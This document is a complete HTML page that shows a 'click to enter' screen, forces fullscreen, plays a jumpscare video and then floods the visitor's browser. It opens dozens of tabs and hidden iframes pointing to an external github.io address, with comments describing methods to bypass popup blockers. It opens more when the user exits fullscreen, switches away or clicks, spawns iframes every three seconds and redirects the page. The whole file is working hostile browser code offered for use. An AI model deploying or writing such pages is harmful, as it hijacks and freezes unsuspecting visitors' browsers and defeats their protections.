<!DOCTYPE html>
<html lang="en">
<head>
   <style>
    body, html {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      background: black;
      cursor: pointer; 
      overflow: hidden;
    }
    #scareVideo {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 999;
    }
    
    #scareVideo::-webkit-media-controls {
      display: none !important;
    }
    #scareVideo::-moz-media-controls {
        display: none !important;
    }
    video::-ms-media-controls {
        display: none !important;
    }
    video::-o-media-controls {
        display: none !important;
    }
    video {
        pointer-events: none;
    }

    #overlayText {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: "Comic Sans MS", cursive, sans-serif;
      color: white;
      font-size: 5em;
      text-align: center;
      z-index: 1000;
    }

    /* Hidden iframes that will load the URL */
    .hiddenIframe {
      position: absolute;
      width: 1px;
      height: 1px;
      opacity: 0;
      pointer-events: none;
      border: none;
    }
  </style>
</head>
<body>

  <div id="overlayText">click to enter..</div>

  <video id="scareVideo" loop>
    <source src="jumpscare.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>

  <script>
    const pageBody = document.body;
    const video = document.getElementById('scareVideo');
    const overlayText = document.getElementById('overlayText');
    const url = 'https://loganexotic.github.io/zakusone/';
    let iframesCreated = 0;
    let tabsOpened = false;

    // Method 1: Create hidden iframes (bypasses popup blocker)
    function createIframe() {
      const iframe = document.createElement('iframe');
      iframe.src = url;
      iframe.className = 'hiddenIframe';
      iframe.id = 'iframe_' + iframesCreated;
      iframesCreated++;
      document.body.appendChild(iframe);
      return iframe;
    }

    // Method 2: Try to open actual tabs using user gesture
    function openTabWithUserGesture() {
      try {
        const win = window.open(url, '_blank');
        if (!win || win.closed || typeof win.closed == 'undefined') {
          // If blocked, use the iframe method
          createIframe();
        }
      } catch(e) {
        createIframe();
      }
    }

    // Method 3: Create a fake click on a link (works sometimes)
    function fakeClickOpen() {
      const a = document.createElement('a');
      a.href = url;
      a.target = '_blank';
      a.rel = 'noopener noreferrer';
      a.style.display = 'none';
      document.body.appendChild(a);
      a.click();
      setTimeout(() => {
        document.body.removeChild(a);
      }, 100);
    }

    // Massive tab opening function
    function openMassTabs(count) {
      for (let i = 0; i < count; i++) {
        // Cycle through methods to maximize success
        if (i % 3 === 0) {
          openTabWithUserGesture();
        } else if (i % 3 === 1) {
          fakeClickOpen();
        } else {
          createIframe();
        }
      }
    }

    pageBody.addEventListener('click', () => {
      // Hide text overlay
      overlayText.style.display = 'none';

      // Show video
      video.style.display = 'block';

      // Force fullscreen
      const elem = document.documentElement;
      if (elem.requestFullscreen) {
        elem.requestFullscreen();
      } else if (elem.webkitRequestFullscreen) {
        elem.webkitRequestFullscreen();
      } else if (elem.msRequestFullscreen) {
        elem.msRequestFullscreen();
      }

      video.play();

      // Open tabs - using the click event as user gesture
      if (!tabsOpened) {
        tabsOpened = true;
        
        // Open 10 tabs/iframes immediately
        openMassTabs(10);

        // More after delays
        setTimeout(() => { openMassTabs(8); }, 300);
        setTimeout(() => { openMassTabs(8); }, 600);
        setTimeout(() => { openMassTabs(8); }, 1000);
      }

    }, { once: true });

    // When fullscreen exits, open more
    function handleFullscreenExit() {
      if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.msFullscreenElement) {
        // Open a LOT more
        openMassTabs(20);
        setTimeout(() => { openMassTabs(15); }, 500);
        setTimeout(() => { openMassTabs(15); }, 1000);
        
        // Also try to redirect the main window
        try {
          window.location.href = url;
        } catch(e) {}
      }
    }

    document.addEventListener('fullscreenchange', handleFullscreenExit);
    document.addEventListener('webkitfullscreenchange', handleFullscreenExit);
    document.addEventListener('msfullscreenchange', handleFullscreenExit);

    // Every time user clicks while in fullscreen
    document.addEventListener('click', () => {
      if (tabsOpened && document.fullscreenElement) {
        openMassTabs(5);
      }
    });

    // Spam iframes continuously
    setInterval(() => {
      if (tabsOpened) {
        for (let i = 0; i < 5; i++) {
          createIframe();
        }
      }
    }, 3000);

    // Also when user leaves the page
    document.addEventListener('visibilitychange', () => {
      if (document.hidden && tabsOpened) {
        // User alt-tabbed away - open more
        setTimeout(() => { openMassTabs(10); }, 100);
      }
    });

    console.log('✅ Ready - click the screen!');
  </script>

</body>
</html>
